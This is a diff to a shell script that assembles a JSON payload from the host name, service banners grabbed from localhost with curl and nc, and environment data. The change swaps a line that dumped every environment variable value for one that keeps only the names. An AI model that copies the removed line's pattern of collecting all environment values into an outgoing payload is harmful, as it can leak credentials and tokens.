@@ -58,7 +58,7 @@ JSON_PAYLOAD=$(cat <<EOF
   "hostname": "$(hostname)",
   "http_banner": "$(curl -I http://localhost 2>/dev/null | head -n 1)",
   "ssh_banner": "$(echo | nc localhost 22 2>/dev/null | head -n 1)",
-  "all_env_vars": "$(printenv)"
+    "env_var_keys": $(printenv | cut -d '=' -f 1 | jq -R . | jq -s .)
 }
 EOF
 )
